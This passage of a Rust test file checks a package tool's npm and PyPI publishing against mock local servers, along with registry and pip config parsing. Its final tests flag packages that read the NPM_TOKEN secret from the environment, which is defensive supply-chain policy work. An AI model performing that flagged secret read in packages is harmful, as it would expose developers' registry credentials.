                whoami
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["_id"], "demo-pkg");
        assert_eq!(body["_rev"], "1-abc");
        assert_eq!(body["users"]["alice"], true);
        assert_eq!(body["users"]["bob"], true);
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let packument = r#"{
              "_id": "demo-pkg",
              "_rev": "2-def",
              "name": "demo-pkg",
              "users": {"alice": true, "bob": true}
            }"#;

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/whoami "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                whoami.len(),
                whoami
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["_id"], "demo-pkg");
        assert_eq!(body["_rev"], "2-def");
        assert!(body["users"].get("alice").is_none());
        assert_eq!(body["users"]["bob"], true);
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg").unwrap();
    let starred = mutate_npm_package_star(
        dir.path(),
        &spec,
        true,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(starred.registry, format!("http://{addr}/"));
    assert_eq!(starred.package, "demo-pkg");
    assert_eq!(starred.user, "alice");
    assert!(starred.starred);
    assert_eq!(starred.status, 200);
    assert_eq!(starred.response["ok"], true);

    let unstarred = mutate_npm_package_star(
        dir.path(),
        &spec,
        false,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(unstarred.registry, format!("http://{addr}/"));
    assert_eq!(unstarred.package, "demo-pkg");
    assert_eq!(unstarred.user, "alice");
    assert!(!unstarred.starred);
    assert_eq!(unstarred.status, 200);
    assert_eq!(unstarred.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn reads_npm_stars_with_userconfig_auth() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/_view/starredByUser?key=%22alice%22 "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{
              "rows": [
                {"value": "left-pad"},
                {"value": "@demo/pkg"},
                {"value": 42}
              ]
            }"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let result =
        read_npm_stars(dir.path(), Some("alice"), None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.user, "alice");
    assert_eq!(result.packages, vec!["left-pad", "@demo/pkg"]);
    assert!(result.response.get("rows").is_some());
    handle.join().unwrap();
}

#[test]
fn publishes_npm_package_with_userconfig_auth_and_otp() {
    use std::io::{Read as _, Write as _};

    let tarball = npm_tgz_for_test(r#"{"name":"demo-pkg","version":"1.0.0"}"#);
    let expected_tarball = tarball.clone();
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        stream
            .set_read_timeout(Some(std::time::Duration::from_secs(5)))
            .unwrap();
        let mut buffer = Vec::new();
        let mut chunk = [0_u8; 4096];
        loop {
            let len = stream.read(&mut chunk).unwrap();
            if len == 0 {
                break;
            }
            buffer.extend_from_slice(&chunk[..len]);
            if let Some(body_start) = http_body_start(&buffer) {
                let headers = String::from_utf8_lossy(&buffer[..body_start]);
                let content_length = http_content_length(&headers);
                if buffer.len() >= body_start + content_length {
                    break;
                }
            }
        }

        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));

        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["_id"], "demo-pkg");
        assert_eq!(body["dist-tags"]["beta"], "1.0.0");
        assert_eq!(body["versions"]["1.0.0"]["name"], "demo-pkg");
        assert_eq!(
            body["versions"]["1.0.0"]["dist"]["shasum"],
            sha1_hex(&expected_tarball)
        );
        assert_eq!(
            body["versions"]["1.0.0"]["dist"]["integrity"],
            npm_publish_integrity(&expected_tarball)
        );
        let encoded = body["_attachments"]["demo-pkg-1.0.0.tgz"]["data"]
            .as_str()
            .unwrap();
        assert_eq!(STANDARD.decode(encoded).unwrap(), expected_tarball);
        assert_eq!(
            body["_attachments"]["demo-pkg-1.0.0.sigstore"]["content_type"],
            "application/vnd.dev.sigstore.bundle+json;version=0.3"
        );
        assert_eq!(
            body["_attachments"]["demo-pkg-1.0.0.sigstore"]["data"],
            r#"{"mediaType":"application/vnd.dev.sigstore.bundle+json;version=0.3","dsseEnvelope":{"payload":"e30="}}"#
        );

        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let result = publish_npm_package(
            dir.path(),
            NpmPublishPackage {
                name: "demo-pkg".to_owned(),
                version: "1.0.0".to_owned(),
                manifest: serde_json::json!({
                    "name": "demo-pkg",
                    "version": "1.0.0",
                    "description": "demo",
                }),
                filename: "demo-pkg-1.0.0.tgz".to_owned(),
                tarball,
                tag: "beta".to_owned(),
                access: Some("public".to_owned()),
                provenance: Some(NpmProvenanceBundle {
                    media_type: "application/vnd.dev.sigstore.bundle+json;version=0.3".to_owned(),
                    data: r#"{"mediaType":"application/vnd.dev.sigstore.bundle+json;version=0.3","dsseEnvelope":{"payload":"e30="}}"#.to_owned(),
                }),
            },
            None,
            Some(Path::new("ci.npmrc")),
            Some("123456"),
        )
        .unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.name, "demo-pkg");
    assert_eq!(result.version, "1.0.0");
    assert_eq!(result.tag, "beta");
    assert_eq!(result.status, 201);
    assert_eq!(result.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn uploads_pypi_wheel_with_basic_auth_and_metadata() {
    use std::io::{Read as _, Write as _};

    let wheel = python_wheel_for_test(
            "Metadata-Version: 2.1\nName: demo-pkg\nVersion: 1.0.0\nSummary: demo package\n\nLong description\n",
        );
    let expected_digest = sha256_hex(&wheel);
    let dir = tempfile::tempdir().unwrap();
    let wheel_path = dir.path().join("demo_pkg-1.0.0-py3-none-any.whl");
    fs::write(&wheel_path, &wheel).unwrap();

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let server_expected_digest = expected_digest.clone();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        stream
            .set_read_timeout(Some(std::time::Duration::from_secs(5)))
            .unwrap();
        let mut buffer = Vec::new();
        let mut chunk = [0_u8; 4096];
        loop {
            let len = stream.read(&mut chunk).unwrap();
            if len == 0 {
                break;
            }
            buffer.extend_from_slice(&chunk[..len]);
            if let Some(body_start) = http_body_start(&buffer) {
                let headers = String::from_utf8_lossy(&buffer[..body_start]);
                let content_length = http_content_length(&headers);
                if buffer.len() >= body_start + content_length {
                    break;
                }
            }
        }

        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("POST /legacy/ "));
        let lower = headers.to_ascii_lowercase();
        let expected_auth = format!(
            "authorization: basic {}",
            STANDARD.encode("__token__:pypi-token")
        )
        .to_ascii_lowercase();
        assert!(lower.contains(&expected_auth));

        let body = String::from_utf8_lossy(&buffer[body_start..]);
        assert!(body.contains(r#"name=":action""#));
        assert!(body.contains("file_upload"));
        assert!(body.contains(r#"name="protocol_version""#));
        assert!(body.contains(r#"name="metadata_version""#));
        assert!(body.contains(r#"name="name""#));
        assert!(body.contains("demo-pkg"));
        assert!(body.contains(r#"name="version""#));
        assert!(body.contains("1.0.0"));
        assert!(body.contains(r#"name="filetype""#));
        assert!(body.contains("bdist_wheel"));
        assert!(body.contains(r#"name="pyversion""#));
        assert!(body.contains("py3"));
        assert!(body.contains(r#"name="sha256_digest""#));
        assert!(body.contains(&server_expected_digest));
        assert!(body.contains(r#"name="comment""#));
        assert!(body.contains("release upload"));
        assert!(body.contains(r#"name="attestations""#));
        assert!(body.contains("predicateType"));
        assert!(body.contains("https://example.invalid/build"));
        assert!(body.contains(r#"filename="demo_pkg-1.0.0-py3-none-any.whl""#));
        assert!(body.contains(r#"name="gpg_signature""#));
        assert!(body.contains(r#"filename="demo_pkg-1.0.0-py3-none-any.whl.asc""#));
        assert!(body.contains("fake-signature"));

        let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let result = upload_pypi_distribution(
        &format!("http://{addr}/legacy/"),
        "__token__",
        "pypi-token",
        &wheel_path,
        PypiUploadOptions {
            comment: Some("release upload"),
            signature: Some(PypiUploadSignature {
                filename: "demo_pkg-1.0.0-py3-none-any.whl.asc",
                bytes: b"fake-signature",
            }),
            attestations: Some(r#"[{"predicateType":"https://example.invalid/build"}]"#),
            ..PypiUploadOptions::default()
        },
    )
    .unwrap();
    assert_eq!(result.repository_url, format!("http://{addr}/legacy/"));
    assert_eq!(result.filename, "demo_pkg-1.0.0-py3-none-any.whl");
    assert_eq!(result.name, "demo-pkg");
    assert_eq!(result.version, "1.0.0");
    assert_eq!(result.filetype, "bdist_wheel");
    assert_eq!(result.pyversion, "py3");
    assert_eq!(result.status, 200);
    assert_eq!(result.sha256_digest, expected_digest);
    assert!(!result.skipped);
    handle.join().unwrap();
}

#[test]
fn checks_pypi_distribution_metadata_warnings_and_strict_mode() {
    let dir = tempfile::tempdir().unwrap();

    let clean_wheel = python_wheel_for_test(
            "Metadata-Version: 2.1\nName: demo-pkg\nVersion: 1.0.0\nDescription-Content-Type: text/markdown\n\n# Long description\n",
        );
    let clean_path = dir.path().join("demo_pkg-1.0.0-py3-none-any.whl");
    fs::write(&clean_path, clean_wheel).unwrap();
    let clean = check_pypi_distribution(&clean_path, true).unwrap();
    assert!(clean.passed);
    assert!(clean.warnings.is_empty());

    let warning_wheel =
        python_wheel_for_test("Metadata-Version: 2.1\nName: demo-pkg\nVersion: 1.0.1\n\n");
    let warning_path = dir.path().join("demo_pkg-1.0.1-py3-none-any.whl");
    fs::write(&warning_path, warning_wheel).unwrap();
    let relaxed = check_pypi_distribution(&warning_path, false).unwrap();
    assert!(relaxed.passed);
    assert!(relaxed
        .warnings
        .iter()
        .any(|warning| warning.contains("long_description_content_type")));
    assert!(relaxed
        .warnings
        .iter()
        .any(|warning| warning.contains("long_description")));

    let strict = check_pypi_distribution(&warning_path, true).unwrap();
    assert!(!strict.passed);
    assert_eq!(strict.warnings, relaxed.warnings);
}

#[test]
fn recognizes_pypi_existing_upload_responses() {
    assert!(pypi_upload_response_is_existing(409, ""));
    assert!(pypi_upload_response_is_existing(
        400,
        "File already exists. See https://pypi.org/help/#file-name-reuse"
    ));
    assert!(!pypi_upload_response_is_existing(403, "Forbidden"));
}

fn read_http_request_bytes(stream: &mut std::net::TcpStream) -> Vec<u8> {
    use std::io::Read as _;

    stream
        .set_read_timeout(Some(std::time::Duration::from_secs(5)))
        .unwrap();
    let mut buffer = Vec::new();
    let mut chunk = [0_u8; 4096];
    loop {
        let len = stream.read(&mut chunk).unwrap();
        if len == 0 {
            break;
        }
        buffer.extend_from_slice(&chunk[..len]);
        if let Some(body_start) = http_body_start(&buffer) {
            let headers = String::from_utf8_lossy(&buffer[..body_start]);
            let content_length = http_content_length(&headers);
            if buffer.len() >= body_start + content_length {
                break;
            }
        }
    }
    buffer
}

fn http_body_start(buffer: &[u8]) -> Option<usize> {
    buffer
        .windows(4)
        .position(|window| window == b"\r\n\r\n")
        .map(|index| index + 4)
}

fn http_content_length(headers: &str) -> usize {
    headers
        .lines()
        .find_map(|line| {
            let (name, value) = line.split_once(':')?;
            name.eq_ignore_ascii_case("content-length")
                .then(|| value.trim().parse::<usize>().ok())
                .flatten()
        })
        .unwrap_or(0)
}

#[test]
fn npm_options_override_default_registry() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join(".npmrc"),
        "registry=https://npmrc.example.invalid/\n",
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.npm_registry_url = Some("https://cli.example.invalid/npm".to_owned());
    let config = read_npm_config_for_options(dir.path(), &options).unwrap();

    assert_eq!(config.registry, "https://cli.example.invalid/npm/");
}

#[test]
fn npm_environment_overrides_npmrc_registry() {
    let mut config = NpmConfig::default();
    parse_npmrc_content("registry=https://npmrc.example.invalid/\n", &mut config);

    apply_npm_environment_values(&mut config, Some("https://env.example.invalid/npm"));

    assert_eq!(config.registry, "https://env.example.invalid/npm/");
}

#[test]
fn npm_userconfig_override_reads_custom_user_npmrc() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        "registry=https://ci-userconfig.example.invalid/npm\n",
    )
    .unwrap();

    let mut config = NpmConfig::default();
    read_npm_user_config(dir.path(), Some(Path::new("ci.npmrc")), &mut config).unwrap();

    assert_eq!(
        config.registry,
        "https://ci-userconfig.example.invalid/npm/"
    );
}

#[test]
fn npm_globalconfig_reads_before_user_and_project_npmrc() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("global.npmrc"),
        "registry=https://global.example.invalid/npm\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("user.npmrc"),
        "@scope:registry=https://scope.example.invalid/npm\n",
    )
    .unwrap();
    fs::write(dir.path().join(".npmrc"), "legacy-peer-deps=true\n").unwrap();

    let snapshot = read_npm_config_snapshot_with_globalconfig(
        dir.path(),
        None,
        Some(Path::new("user.npmrc")),
        Some(Path::new("global.npmrc")),
    )
    .unwrap();

    assert_eq!(snapshot.registry, "https://global.example.invalid/npm/");
    assert_eq!(
        snapshot.scoped_registries.get("@scope").map(String::as_str),
        Some("https://scope.example.invalid/npm/")
    );
}

#[test]
fn reads_manifest_policy_grants_and_pypi_indexes() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("omc.toml"),
        r#"
            [project]
            name = "policy-demo"
            version = "0.1.0"

            [policy]
            allow = ["http:api.example.com", "env:API_TOKEN"]
            allow-flow = ["env:API_TOKEN -> network:api.example.com"]

            [registries]
            pypi-index-url = "https://mirror.example/simple"
            pypi-extra-index-urls = ["https://extra.example/simple"]
            "#,
    )
    .unwrap();

    let options = options_with_manifest_policy(&LinkOptions::new(dir.path())).unwrap();
    assert!(options
        .allowed_capabilities
        .contains(&Capability::HttpHost("api.example.com".to_owned())));
    assert!(options
        .allowed_capabilities
        .contains(&Capability::EnvRead("API_TOKEN".to_owned())));
    assert!(options.allowed_flows.contains(&FlowRule::new(
        LabelMatcher::Env("API_TOKEN".to_owned()),
        Sink::Network("api.example.com".to_owned())
    )));
    assert_eq!(
        options.pypi_index_url.as_deref(),
        Some("https://mirror.example/simple/")
    );
    assert_eq!(
        options.pypi_extra_index_urls,
        vec!["https://extra.example/simple/".to_owned()]
    );
}

#[test]
fn applies_pypi_environment_indexes() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    apply_pypi_environment_values(
            &mut options,
            dir.path(),
            PypiEnvironmentValues {
                index_url: Some("https://env.example/simple"),
                extra_index_urls: Some(
                    "https://extra.example/simple 'https://quoted.example/simple' https://extra.example/simple",
                ),
                find_links: Some("./wheelhouse https://files.example/packages"),
                requirement_files: None,
                constraint_files: None,
                no_binary: Some(":all:"),
                only_binary: Some("idna"),
                all_releases: Some("previewed"),
                only_final: Some("stable-only"),
                uploaded_prior_to: Some("P7D"),
                no_index: true,
                allow_prereleases: true,
                override_index: true,
            },
        );

    assert_eq!(
        options.pypi_index_url.as_deref(),
        Some("https://env.example/simple/")
    );
    assert_eq!(
        options.pypi_extra_index_urls,
        vec![
            "https://extra.example/simple/".to_owned(),
            "https://quoted.example/simple/".to_owned(),
        ]
    );
    assert_eq!(
        options.pypi_find_links,
        vec![
            dir.path()
                .join(".")
                .join("wheelhouse")
                .to_string_lossy()
                .into_owned(),
            "https://files.example/packages".to_owned(),
        ]
    );
    assert_eq!(options.pypi_binary_all, Some(PypiBinaryMode::Source));
    assert_eq!(
        options.pypi_binary_packages.get("idna"),
        Some(&PypiBinaryMode::Binary)
    );
    assert!(options.pypi_no_index);
    assert!(options.pypi_allow_prereleases);
    assert!(options
        .pypi_release_controls
        .all_releases
        .packages
        .contains("previewed"));
    assert!(options
        .pypi_release_controls
        .only_final
        .packages
        .contains("stable-only"));
    assert_eq!(options.pypi_uploaded_prior_to.as_deref(), Some("P7D"));

    apply_pypi_environment_values(
        &mut options,
        dir.path(),
        PypiEnvironmentValues {
            index_url: Some("https://ignored.example/simple"),
            extra_index_urls: Some("https://another.example/simple"),
            find_links: Some("./wheelhouse"),
            ..PypiEnvironmentValues::default()
        },
    );
    assert_eq!(
        options.pypi_index_url.as_deref(),
        Some("https://env.example/simple/")
    );
    assert_eq!(
        options.pypi_extra_index_urls,
        vec![
            "https://extra.example/simple/".to_owned(),
            "https://quoted.example/simple/".to_owned(),
            "https://another.example/simple/".to_owned(),
        ]
    );

    let mut options = LinkOptions::new(dir.path());
    options.pypi_index_url = Some("https://pip-config.example/simple/".to_owned());
    apply_pypi_environment_values(
        &mut options,
        dir.path(),
        PypiEnvironmentValues {
            override_index: true,
            ..PypiEnvironmentValues::default()
        },
    );
    assert_eq!(
        options.pypi_index_url.as_deref(),
        Some("https://pip-config.example/simple/")
    );
    apply_pypi_environment_values(
        &mut options,
        dir.path(),
        PypiEnvironmentValues {
            index_url: Some("https://env-override.example/simple"),
            override_index: true,
            ..PypiEnvironmentValues::default()
        },
    );
    assert_eq!(
        options.pypi_index_url.as_deref(),
        Some("https://env-override.example/simple/")
    );
}

#[test]
fn applies_pypi_environment_requirement_and_constraint_files() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("requirements")).unwrap();
    fs::create_dir_all(dir.path().join("constraints")).unwrap();
    fs::write(
        dir.path().join("requirements").join("base.txt"),
        "idna>=2\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("requirements").join("dev.txt"),
        "certifi==2024.2.2\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("constraints").join("prod constraints.txt"),
        "idna==3.7\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("constraints").join("base.txt"),
        "certifi==2024.2.2\n",
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    apply_pypi_environment_values(
        &mut options,
        dir.path(),
        PypiEnvironmentValues {
            requirement_files: Some(
                "requirements/base.txt requirements/dev.txt requirements/base.txt",
            ),
            constraint_files: Some("'constraints/prod constraints.txt' constraints/base.txt"),
            ..PypiEnvironmentValues::default()
        },
    );

    assert_eq!(
        options.requirement_files,
        vec![
            dir.path().join("requirements").join("base.txt"),
            dir.path().join("requirements").join("dev.txt"),
        ]
    );
    assert_eq!(
        options.constraint_files,
        vec![
            dir.path().join("constraints").join("prod constraints.txt"),
            dir.path().join("constraints").join("base.txt"),
        ]
    );

    let specs = project_requested_specs(&mut options, false).unwrap();
    assert!(has_spec(&specs, "idna", ">=2"));
    assert!(has_spec(&specs, "certifi", "==2024.2.2"));
    assert_eq!(
        options.constraints.get("pypi:idna").map(String::as_str),
        Some("==3.7")
    );
    assert_eq!(
        options.constraints.get("pypi:certifi").map(String::as_str),
        Some("==2024.2.2")
    );
}

#[test]
fn parses_pip_config_indexes() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = PipConfig::default();
    parse_pip_config_content(
        r#"
            [global]
            index-url = https://global.example/simple
            extra-index-url = https://extra.example/simple 'https://quoted.example/simple'
            find-links = ./wheelhouse
            requirement = requirements/base.txt 'requirements/dev requirements.txt'
            constraint = constraints/base.txt

            [install]
            extra-index-url =
                https://install-extra.example/simple
                https://extra.example/simple
            find-links =
                https://files.example/packages
                ./wheelhouse
            constraint =
                constraints/prod.txt
                constraints/base.txt
            no-binary = :all:
            only-binary = idna
            no-index = true
            pre = true
            all-releases = previewed
            only-final = stable-only
            uploaded-prior-to = P3D

            [download]
            index-url = https://ignored.example/simple
            "#,
        dir.path(),
        &mut config,
    );

    assert_eq!(
        config.index_url.as_deref(),
        Some("https://global.example/simple/")
    );
    assert_eq!(
        config.extra_index_urls,
        vec![
            "https://extra.example/simple/".to_owned(),
            "https://quoted.example/simple/".to_owned(),
            "https://install-extra.example/simple/".to_owned(),
        ]
    );
    assert_eq!(
        config.find_links,
        vec![
            dir.path()
                .join(".")
                .join("wheelhouse")
                .to_string_lossy()
                .into_owned(),
            "https://files.example/packages".to_owned(),
        ]
    );
    assert_eq!(
        config.requirement_files,
        vec![
            dir.path().join("requirements").join("base.txt"),
            dir.path().join("requirements").join("dev requirements.txt"),
        ]
    );
    assert_eq!(
        config.constraint_files,
        vec![
            dir.path().join("constraints").join("base.txt"),
            dir.path().join("constraints").join("prod.txt"),
        ]
    );
    assert_eq!(config.binary_all, Some(PypiBinaryMode::Source));
    assert_eq!(
        config.binary_packages.get("idna"),
        Some(&PypiBinaryMode::Binary)
    );
    assert!(config.no_index);
    assert!(config.allow_prereleases);
    assert!(config
        .release_controls
        .all_releases
        .packages
        .contains("previewed"));
    assert!(config
        .release_controls
        .only_final
        .packages
        .contains("stable-only"));
    assert_eq!(config.uploaded_prior_to.as_deref(), Some("P3D"));
}

#[test]
fn reads_xdg_and_project_relative_pip_config_file() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    let home = dir.path().join("home");
    let xdg = dir.path().join("xdg");
    fs::create_dir_all(project.join("ci")).unwrap();
    fs::create_dir_all(home.join(".config").join("pip")).unwrap();
    fs::create_dir_all(xdg.join("pip")).unwrap();

    fs::write(
            xdg.join("pip").join("pip.conf"),
            "[global]\nextra-index-url = https://xdg-extra.example/simple\nfind-links = ./xdg-wheelhouse\n",
        )
        .unwrap();
    fs::write(
        project.join("pip.conf"),
        "[global]\nindex-url = https://project.example/simple\n",
    )
    .unwrap();
    fs::write(
            project.join("ci").join("pip.conf"),
            "[global]\nindex-url = https://override.example/simple\nconstraint = constraints/prod.txt\n",
        )
        .unwrap();

    with_env_values(
        &[
            ("HOME", Some(home.to_str().unwrap())),
            ("XDG_CONFIG_HOME", Some(xdg.to_str().unwrap())),
            ("PIP_CONFIG_FILE", Some("ci/pip.conf")),
        ],
        || {
            let config = read_pip_config(&project).unwrap();
            assert_eq!(
                config.index_url.as_deref(),
                Some("https://override.example/simple/")
            );
            assert!(config
                .extra_index_urls
                .contains(&"https://xdg-extra.example/simple/".to_owned()));
            assert!(config.find_links.contains(
                &xdg.join("pip")
                    .join(".")
                    .join("xdg-wheelhouse")
                    .to_string_lossy()
                    .into_owned()
            ));
            assert!(config
                .constraint_files
                .contains(&project.join("ci").join("constraints").join("prod.txt")));
        },
    );
}

#[test]
fn generated_profile_module_rejects_capabilities_by_default() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    }];
    let module = module_from_profile(&package, &findings);
    let error = verify_module(&module, &Policy::pure()).unwrap_err();
    assert!(error
        .findings
        .iter()
        .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
}

#[test]
fn link_policy_allows_public_node_debug_env_read_only() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "semver".to_owned(),
        version: "7.8.1".to_owned(),
        source_url: "https://example.invalid/semver.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "semver.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let policy = policy_from_link_options(&LinkOptions::new("."));
    let node_debug_module = module_from_profile(
        &package,
        &[CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NODE_DEBUG".to_owned(),
            source: "package/internal/debug.js".to_owned(),
            evidence: "process.env".to_owned(),
        }],
    );
    assert!(verify_module(&node_debug_module, &policy).is_ok());

    let secret_module = module_from_profile(
        &package,
        &[CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "package/index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }],
    );
    let error = verify_module(&secret_module, &policy).unwrap_err();
    assert!(error
        .findings
        .iter()
        .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
}

#[test]
fn artifact_serializes_generated_microcode() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    }];
    let artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
